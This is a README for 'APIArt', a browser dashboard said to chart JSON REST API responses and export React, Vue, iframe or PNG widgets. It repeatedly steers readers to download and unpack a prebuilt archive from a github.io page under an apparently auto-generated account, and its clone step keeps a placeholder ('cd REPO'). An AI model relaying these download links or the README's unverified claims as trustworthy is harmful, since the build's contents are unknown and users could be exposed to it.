# APIArt - API Dashboard 2026

> **APIArt is a browser-based dashboard that converts JSON REST API responses into live visualizations, supports streaming telemetry workflows and edge proxies, and exports reusable dashboard components.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/greenloganbeqd5894/apiart-api-dashboard?style=flat-square)](https://github.com/greenloganbeqd5894/apiart-api-dashboard)

---

<p align="center">
  <a href="https://greenloganbeqd5894.github.io/apiart-api-dashboard/">
    <img src="https://img.shields.io/badge/Download-APIArt%20Latest-brightgreen?style=for-the-badge" alt="Download APIArt">
  </a>
</p>

> **[Download APIArt Latest](https://greenloganbeqd5894.github.io/apiart-api-dashboard/)**

---

[Download Latest Build](https://greenloganbeqd5894.github.io/apiart-api-dashboard/)

---

## Overview

APIArt gives developers and teams a live web interface for examining data returned by JSON REST APIs. It analyzes response structures, recognizes potential metrics, and displays changing values through polling or streaming-oriented visualizations.

The application brings together Rust and WebAssembly processing with Cloudflare Workers edge functionality. Its responsive UI is suited to telemetry review and data exploration. Finished dashboards can also be exported for reuse as iframe embeds, React components, Vue components, or high-DPI images.

---

## Highlights

- Automatically derives useful structures from JSON schemas and API responses.
- Finds metrics using zero-copy processing methods.
- Works with Cloudflare Edge proxy workflows.
- Includes CORS bypass support for compatible API access patterns.
- Records rate-limit headers so request conditions remain visible.
- Renders charts that refresh through live polling.
- Exports responsive HTML iframe widgets.
- Outputs components for both React and Vue.
- Creates high-DPI PNG images.
- Presents the interface with a dark, glassmorphism-inspired design.

---

## Getting Started

### Use the web build

1. Get the newest APIArt build from the [download location](https://greenloganbeqd5894.github.io/apiart-api-dashboard/).
2. Unpack the files when the download is archived.
3. Open the supplied web entry point in a supported browser, or serve the files from your preferred web host.

### Work from the repository

```bash
git clone https://github.com/greenloganbeqd5894/apiart-api-dashboard.git
cd REPO
```

If your deployment requires the Cloudflare Edge proxy, inspect the worker files and set up deployment through your Cloudflare Workers workflow.

---

## Using APIArt

The usual process is:

1. Launch APIArt in a web browser.
2. Enter the JSON REST API endpoint you want to analyze.
3. Let the application inspect the response schema and determine which metrics are available.
4. Choose a live polling chart or another available visualization.
5. Examine telemetry details and any captured rate-limit headers.
6. Export the dashboard as an iframe, HTML widget, React component, Vue component, or PNG.

For endpoints that need edge routing, configure the Cloudflare proxy before creating the visualization. Once generated, the dashboard may be embedded in another page or used as component output.

---

## Settings and Deployment

APIArt is configured through the web interface together with the files used for deployment. Depending on how it is installed, review these settings:

- API endpoint and request parameters
- Polling frequency and chart type
- Cloudflare Worker proxy configuration
- CORS request routing
- Export type and image or output dimensions
- Theme and display options

For source deployments, store worker-specific and hosting-specific values separately from the core application files.

---

## Requirements

- A current web browser that supports WebAssembly.
- Access to the JSON REST API being visualized.
- Either a web host or a local server environment for the HTML build.
- Cloudflare Workers access if the Cloudflare Edge proxy is enabled.
- Network access permitted to the chosen API endpoint.
- No extra browser storage beyond ordinary web application use.

---

## Frequently Asked Questions

### Which data formats does APIArt support?

APIArt targets JSON REST API responses, including responses with measurable values that can be used in charts and telemetry displays.

### Can dashboards refresh themselves?

Yes. Live polling charts request updated API data at the configured intervals.

### Can I place an APIArt dashboard on another site?

Yes. You can export a responsive HTML iframe and also generate React or Vue component code.

### What is the approach for cross-origin requests?

When suitable for the API and deployment, use the CORS bypass and Cloudflare Edge proxy options. Confirm that the endpoint and hosting configuration permit the required request path.

### Where are polling and export options configured?

These options are available in the web interface. Deployments built from source may also provide worker or hosting files for environment-specific configuration.

### Why might a visualization show no chart data?

First verify that the endpoint returns valid JSON. Then inspect the inferred schema, confirm that the chosen field contains usable metric values, and check the request and rate-limit details.

### Where do I get new builds?

Project updates are delivered through the repository and the current web build location: [Download Latest Build](https://greenloganbeqd5894.github.io/apiart-api-dashboard/).

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
